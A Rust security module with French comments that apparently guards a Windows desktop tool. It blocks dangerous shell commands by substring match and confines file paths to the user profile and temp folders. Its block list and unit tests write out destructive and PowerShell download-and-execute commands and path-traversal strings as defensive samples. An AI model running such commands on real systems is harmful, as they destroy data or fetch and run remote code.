use anyhow::{bail, Context, Result};
use std::path::{Path, PathBuf};

/// Patterns that are always blocked regardless of permission level
const BLOCKED_COMMAND_PATTERNS: &[&str] = &[
    "rm -rf /",
    "format c:",
    "del /s /f /q c:\\",
    "rd /s /q c:\\",
    "shutdown /",
    "reg delete hklm",
    "bcdedit",
    "diskpart",
    "net user administrator",
    "powershell -enc",   // Encoded payloads
    "invoke-expression", // Alias iex
    "downloadstring",    // Web download + exec pattern
    "bypass",            // ExecutionPolicy bypass
];

const MAX_COMMAND_LEN: usize = 2048;

/// Check a command string against the safety blocklist.
pub fn check_command(command: &str) -> Result<()> {
    if command.len() > MAX_COMMAND_LEN {
        bail!(
            "Commande trop longue ({} chars > {} max)",
            command.len(),
            MAX_COMMAND_LEN
        );
    }

    let lower = command.to_lowercase();
    for pattern in BLOCKED_COMMAND_PATTERNS {
        if lower.contains(pattern) {
            bail!("Commande bloquée par politique de sécurité (pattern: '{pattern}')");
        }
    }

    Ok(())
}

/// Racines autorisées (profil utilisateur, temp), canonicalisées.
fn allowed_roots() -> Vec<PathBuf> {
    let mut roots = Vec::new();
    if let Ok(profile) = std::env::var("USERPROFILE") {
        if !profile.is_empty() {
            // Si la canonicalisation échoue (profil factice en test), on garde
            // la valeur brute : elle vient de l'environnement, pas de l'appelant.
            roots.push(dunce::canonicalize(&profile).unwrap_or_else(|_| PathBuf::from(profile)));
        }
    }
    let temp = std::env::temp_dir();
    roots.push(dunce::canonicalize(&temp).unwrap_or(temp));
    roots
}

/// Canonicalise `path` en tolérant une cible inexistante (cas de la création
/// de fichier) : on canonicalise alors le premier ancêtre existant puis on
/// ré-attache les composants restants, en refusant tout `.`/`..` non résolu.
fn canonicalize_lenient(path: &Path) -> Result<PathBuf> {
    if let Ok(canonical) = dunce::canonicalize(path) {
        return Ok(canonical);
    }
    let mut ancestor = path;
    let mut tail: Vec<&std::ffi::OsStr> = Vec::new();
    loop {
        // file_name() est None pour `..`, `.` ou une racine : rejet.
        let name = ancestor
            .file_name()
            .context("traversal (`..`) dans un segment non résolu")?;
        tail.push(name);
        ancestor = ancestor.parent().context("aucun ancêtre existant")?;
        if let Ok(canonical) = dunce::canonicalize(ancestor) {
            let mut out = canonical;
            for name in tail.iter().rev() {
                out.push(name);
            }
            return Ok(out);
        }
    }
}

/// Windows compare les chemins sans tenir compte de la casse : on aligne tout
/// en minuscules avant la comparaison composant par composant.
fn fold_case(path: &Path) -> PathBuf {
    PathBuf::from(path.to_string_lossy().to_lowercase())
}

/// Vérifie qu'un chemin est confiné aux racines autorisées (profil
/// utilisateur, temp) et retourne sa forme canonique — c'est elle que
/// l'appelant doit utiliser pour l'opération filesystem (symlinks/jonctions
/// résolus, comparaison par composants et non par préfixe de chaîne).
pub fn check_path(path: &str) -> Result<PathBuf> {
    let requested = Path::new(path);
    if !requested.is_absolute() {
        bail!("Chemin non autorisé: {path}. Un chemin absolu est requis.");
    }

    let canonical = canonicalize_lenient(requested)
        .map_err(|e| anyhow::anyhow!("Chemin non autorisé: {path} ({e})"))?;

    let folded = fold_case(&canonical);
    let permitted = allowed_roots()
        .iter()
        .any(|root| folded.starts_with(fold_case(root)));
    if !permitted {
        bail!(
            "Chemin non autorisé: {path}. Seuls les dossiers utilisateur et temp sont accessibles."
        );
    }

    Ok(canonical)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Mutex;

    // check_path lit USERPROFILE : on sérialise les tests qui mutent l'env
    // pour éviter les courses entre threads de test.
    static ENV_LOCK: Mutex<()> = Mutex::new(());

    // ─── check_command ─────────────────────────────────────────

    #[test]
    fn command_allows_benign() {
        assert!(check_command("git status").is_ok());
        assert!(check_command("cargo build --release").is_ok());
        assert!(check_command("Get-ChildItem C:\\Users").is_ok());
    }

    #[test]
    fn command_blocks_destructive_patterns() {
        for cmd in [
            "rm -rf /",
            "format c:",
            "del /s /f /q c:\\",
            "rd /s /q c:\\",
            "shutdown /s /t 0",
            "reg delete hklm\\software",
            "bcdedit /set testsigning on",
            "diskpart /s script.txt",
            "net user administrator P@ss",
        ] {
            assert!(check_command(cmd).is_err(), "aurait dû être bloqué: {cmd}");
        }
    }

    #[test]
    fn command_blocks_powershell_evasion() {
        for cmd in [
            "powershell -enc SQBFAFgA",
            "Invoke-Expression $payload",
            "(New-Object Net.WebClient).DownloadString('http://x')",
            "powershell -ExecutionPolicy Bypass -File x.ps1",
        ] {
            assert!(check_command(cmd).is_err(), "aurait dû être bloqué: {cmd}");
        }
    }

    #[test]
    fn command_blocklist_is_case_insensitive() {
        assert!(check_command("RM -RF /").is_err());
        assert!(check_command("FORMAT C:").is_err());
        assert!(check_command("Invoke-EXPRESSION x").is_err());
    }

    #[test]
    fn command_rejects_overlong() {
        let at_limit = "a".repeat(MAX_COMMAND_LEN);
        assert!(check_command(&at_limit).is_ok());
        let over = "a".repeat(MAX_COMMAND_LEN + 1);
        assert!(check_command(&over).is_err());
    }

    // ─── check_path ────────────────────────────────────────────

    #[test]
    fn path_blocks_traversal() {
        let _g = ENV_LOCK.lock().unwrap();
        std::env::set_var("USERPROFILE", "C:\\Users\\testuser");
        assert!(check_path("C:\\Users\\testuser\\..\\Windows\\evil.dll").is_err());
        assert!(check_path("C:/Users/testuser/../../secret").is_err());
        // `..` dans un segment non résolu (cible inexistante)
        assert!(check_path("C:\\Users\\testuser\\nope\\..\\..\\x.txt").is_err());
    }

    #[test]
    fn path_blocks_neighbor_prefix() {
        // « C:\Users\testuser-evil » commence par la même chaîne que la racine
        // autorisée « C:\Users\testuser » : la comparaison par composants doit
        // le refuser (l'ancienne comparaison par préfixe de chaîne l'acceptait).
        let _g = ENV_LOCK.lock().unwrap();
        std::env::set_var("USERPROFILE", "C:\\Users\\testuser");
        assert!(check_path("C:\\Users\\testuser-evil\\x.txt").is_err());
        assert!(check_path("C:\\Users\\testuserX\\doc.txt").is_err());
    }

    #[test]
    fn path_rejects_relative() {
        let _g = ENV_LOCK.lock().unwrap();
        std::env::set_var("USERPROFILE", "C:\\Users\\testuser");
        assert!(check_path("Documents\\note.txt").is_err());
        assert!(check_path("./x.txt").is_err());
    }

    #[test]
    fn path_returns_canonical_form() {
        let _g = ENV_LOCK.lock().unwrap();
        std::env::set_var("USERPROFILE", "C:\\Users\\testuser");
        // Cible inexistante sous une racine autorisée : autorisée, et le
        // chemin retourné se termine par les composants demandés.
        let out = check_path("C:\\Users\\testuser\\Documents\\new-file.txt").unwrap();
        assert!(
            out.ends_with("Documents\\new-file.txt") || out.ends_with("Documents/new-file.txt")
        );
    }

    #[test]
    fn path_allows_user_profile_and_temp() {
        let _g = ENV_LOCK.lock().unwrap();
        std::env::set_var("USERPROFILE", "C:\\Users\\testuser");
        assert!(check_path("C:\\Users\\testuser\\Documents\\note.txt").is_ok());
        // Insensible à la casse et aux séparateurs
        assert!(check_path("c:/users/TESTUSER/x.txt").is_ok());

        let temp_file = std::env::temp_dir().join("catdesk-test.txt");
        assert!(check_path(&temp_file.to_string_lossy()).is_ok());
    }

    #[test]
    fn path_blocks_outside_allowed_roots() {
        let _g = ENV_LOCK.lock().unwrap();
        std::env::set_var("USERPROFILE", "C:\\Users\\testuser");
        assert!(check_path("C:\\Windows\\System32\\cmd.exe").is_err());
        assert!(check_path("C:\\Users\\autre\\doc.txt").is_err());
        assert!(check_path("D:\\data\\x.txt").is_err());
    }
}
